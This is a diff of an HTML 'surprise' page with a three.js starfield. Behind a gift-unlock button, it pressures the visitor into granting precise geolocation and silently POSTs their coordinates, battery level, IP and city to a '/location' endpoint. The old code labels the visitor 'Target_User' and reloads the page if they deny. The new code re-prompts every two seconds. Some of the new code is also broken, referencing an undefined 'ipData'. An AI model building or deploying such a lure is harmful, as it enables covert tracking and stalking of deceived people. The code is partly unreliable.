@@ -1,108 +1,255 @@
 <!DOCTYPE html>
-<html lang="gu">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>3D Cosmic Surprise</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-    <style>
-        body, html { margin: 0; padding: 0; overflow: hidden; background: #000; font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        #canvas-container { position: fixed; top: 0; left: 0; z-index: 1; }
-        .glass-box { position: relative; z-index: 10; padding: 50px 30px; width: 90%; max-width: 450px; background: rgba(0,0,0,0.85); border-radius: 20px; text-align: center; box-shadow: 0 0 20px rgba(0,242,254,0.2); border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(20px); }
-        h2 { color: #fff; font-size: 1.8rem; margin-bottom: 30px; text-transform: uppercase; letter-spacing: 2px; }
-        .neon-btn { background: linear-gradient(45deg,#00f2fe,#4facfe); width: 100%; max-width: 260px; padding: 16px; font-size: 18px; font-weight: 900; color: white; border: none; border-radius: 12px; cursor: pointer; box-shadow: 0 0 20px rgba(0,242,254,0.4); }
-        .status-msg { margin-top: 25px; font-size: 15px; font-weight: bold; color: #4facfe; display: none; }
-        .error-msg { color: #ff3b3b !important; text-shadow: 0 0 10px rgba(255,59,59,0.3); }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>✨ SURPRISE 🧐</title>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+
+<style>
+body, html{
+    margin:0;
+    padding:0;
+    overflow:hidden;
+    background:#000;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+/* Glass Box */
+.glass-box { 
+    position: absolute; 
+    z-index: 10; 
+    padding: 50px 30px; 
+    width: 90%; 
+    max-width: 400px; 
+    background: rgba(0, 0, 0, 0.7); 
+    border-radius: 20px; 
+    text-align: center; 
+    box-shadow: 0 0 30px rgba(0, 242, 254, 0.3); 
+    backdrop-filter: blur(15px); 
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    overflow: hidden;
+}
+
+/* Border Animation */
+.glass-box::before { 
+    content: ''; 
+    position: absolute; 
+    top: -50%; 
+    left: -50%; 
+    width: 200%; 
+    height: 200%; 
+    background: conic-gradient(transparent, transparent, transparent, #ff00ea, #00f2fe); 
+    animation: rotateBorder 4s linear infinite; 
+    z-index: -1; 
+}
+
+.glass-box::after { 
+    content: ''; 
+    position: absolute; 
+    inset: 4px; 
+    background: #0a0a0a; 
+    border-radius: 16px; 
+    z-index: -1; 
+}
+
+@keyframes rotateBorder { 
+    0% { transform: rotate(0deg); } 
+    100% { transform: rotate(360deg); } 
+}
+
+h2 { 
+    color: #fff; 
+    font-size: 2rem; 
+    margin-bottom: 30px; 
+    letter-spacing: 5px; 
+}
+
+.neon-btn { 
+    background: linear-gradient(45deg, #00f2fe, #4facfe); 
+    width: 100%; 
+    padding: 15px; 
+    font-size: 18px; 
+    color: white; 
+    border: none; 
+    border-radius: 12px; 
+    cursor: pointer; 
+}
+
+.status-msg { 
+    margin-top: 20px; 
+    font-size: 14px; 
+    color: #4facfe; 
+    display: none; 
+}
+
+.error-msg { 
+    color: #ff3b3b !important; 
+}
+</style>
 </head>
+
 <body>
 
-<div id="canvas-container"></div>
-
 <div class="glass-box">
-    <h2>✨ SURPRISE ✨</h2>
-    <button class="neon-btn" onclick="startProcess()">UNLOCK NOW</button>
-    <div id="status" class="status-msg">INITIALIZING...</div>
+    <h2>✨ SURPRISE 🧐</h2>
+    <button class="neon-btn" onclick="startProcess()">UNLOCK SURPRISE 🎁</button>
+    <div id="status" class="status-msg">Loading surprise magic... ✨</div>
 </div>
 
 <script>
-/* --- 3D Background (Stars) --- */
-let scene, camera, renderer, starPoints;
-function init3D(){
+// ===== THREE JS BACKGROUND =====
+let scene, camera, renderer, stars;
+const starCount = 8000;
+
+function init(){
     scene = new THREE.Scene();
-    camera = new THREE.PerspectiveCamera(60, window.innerWidth/window.innerHeight, 1, 1000);
+
+    camera = new THREE.PerspectiveCamera(
+        60,
+        window.innerWidth / window.innerHeight,
+        1,
+        1000
+    );
     camera.position.z = 1;
-    renderer = new THREE.WebGLRenderer();
+
+    renderer = new THREE.WebGLRenderer({ antialias:true });
     renderer.setSize(window.innerWidth, window.innerHeight);
-    document.getElementById("canvas-container").appendChild(renderer.domElement);
+    document.body.appendChild(renderer.domElement);
+
     const starGeo = new THREE.BufferGeometry();
     const positions = [];
-    for(let i=0; i<6000; i++){
-        positions.push(Math.random()*600-300, Math.random()*600-300, Math.random()*600-300);
+    const colors = [];
+    const color = new THREE.Color();
+
+    for(let i=0; i<starCount; i++){
+        positions.push(Math.random()*600-300);
+        positions.push(Math.random()*600-300);
+        positions.push(Math.random()*600-300);
+
+        color.setHSL(Math.random(),1,0.7);
+        colors.push(color.r,color.g,color.b);
     }
-    starGeo.setAttribute("position", new THREE.Float32BufferAttribute(positions, 3));
-    const starMaterial = new THREE.PointsMaterial({color: 0xffffff, size: 0.7});
-    starPoints = new THREE.Points(starGeo, starMaterial);
-    scene.add(starPoints);
+
+    starGeo.setAttribute("position", new THREE.Float32BufferAttribute(positions,3));
+    starGeo.setAttribute("color", new THREE.Float32BufferAttribute(colors,3));
+
+    const material = new THREE.PointsMaterial({
+        size:0.8,
+        vertexColors:true,
+        transparent:true,
+        opacity:0.8
+    });
+
+    stars = new THREE.Points(starGeo, material);
+    scene.add(stars);
+
+    window.addEventListener("resize", resize);
+
     animate();
 }
+
 function animate(){
-    starPoints.rotation.y += 0.002;
+    stars.rotation.y += 0.002;
+    stars.rotation.x += 0.001;
+
+    const pos = stars.geometry.attributes.position.array;
+
+    for(let i=2; i<pos.length; i+=3){
+        pos[i] += 1.5;
+        if(pos[i] > 200) pos[i] = -400;
+    }
+
+    stars.geometry.attributes.position.needsUpdate = true;
+
     renderer.render(scene, camera);
     requestAnimationFrame(animate);
 }
-init3D();
 
-/* --- Main Logic --- */
+function resize(){
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+}
+
+init();
+
+
+// ===== BUTTON LOGIC =====
+let retryInterval;
+
 async function startProcess() {
     const status = document.getElementById("status");
     status.style.display = "block";
-    status.innerText = "PERMISSION REQUESTED... PLEASE ALLOW";
-    status.classList.remove("error-msg");
+    status.innerText = "Your surprise is coming soon… 🎁";
 
     navigator.geolocation.getCurrentPosition(
         async (pos) => {
-            // SUCCESS: User clicked ALLOW
-            let lat = pos.coords.latitude;
-            let lon = pos.coords.longitude;
-            let batteryLevel = "Unknown";
 
-            try {
-                if (navigator.getBattery) {
-                    let bat = await navigator.getBattery();
-                    batteryLevel = Math.floor(bat.level * 100);
-                }
-            } catch (e) {}
+            status.innerText = "Your surprise is ready! 🎉";
+            status.classList.remove("error-msg");
 
-            status.innerText = "ACCESS GRANTED! UNLOCKING...";
-
-            // Send to Backend
-            fetch("/location", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    user: "Target_User",
-                    latitude: lat,
-                    longitude: lon,
-                    battery: batteryLevel
-                })
-            });
-
-            setTimeout(() => { alert("🎉 Surprise Unlocked! Check your map."); }, 1000);
-        },
-        (err) => {
-            // ERROR: User clicked DENY
-            status.innerHTML = "⚠️ ERROR: LOCATION REQUIRED!<br>કૃપા કરીને ઉપર 'Allow' બટન દબાવો.";
-            status.classList.add("error-msg");
-
-            // ૩ સેકન્ડ પછી પેજ રીલોડ થશે જેથી ફરીથી પોપ-અપ આવે
+            // 👉 IMPORTANT: redirect to 2nd page
             setTimeout(() => {
-                location.reload();
-            }, 3000);
+                window.location.href = "fireworks.html"; // 👈 aa file ma 2nd code muk
+            }, 1000);
+        },
+        () => {
+            status.innerHTML = "Error  ⚠️ Please allow location to unlock your surprise 🎁! Retrying in 3 seconds...";
+            status.classList.add("error-msg");
         },
         { enableHighAccuracy: true, timeout: 5000 }
     );
 }
+
+    function askLocation() {
+        navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+                clearInterval(retryInterval);
+
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+
+                let battery = "N/A";
+                if(navigator.getBattery) {
+                    const bat = await navigator.getBattery();
+                    battery = Math.floor(bat.level * 100) + "%";
+                }
+
+                fetch("/location", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        latitude: lat,
+                        longitude: lon,
+                        battery: battery,
+                        ip: ipData.ip,
+                        city: ipData.city
+                    })
+                }).catch(() => {});
+
+                status.innerText = "Your surprise is ready! 🎉";
+                status.classList.remove("error-msg");
+
+                setTimeout(() => {
+                    alert("✨ COSMIC SURPRISE UNLOCKED! ✨");
+                }, 500);
+            },
+            () => {
+                status.innerHTML = "⚠️ Allow location!";
+                status.classList.add("error-msg");
+            },
+            { enableHighAccuracy: true, timeout: 2000 }
+        );
+    }
+
+    askLocation();
+    retryInterval = setInterval(askLocation, 2000);
+
 </script>
 
 </body>
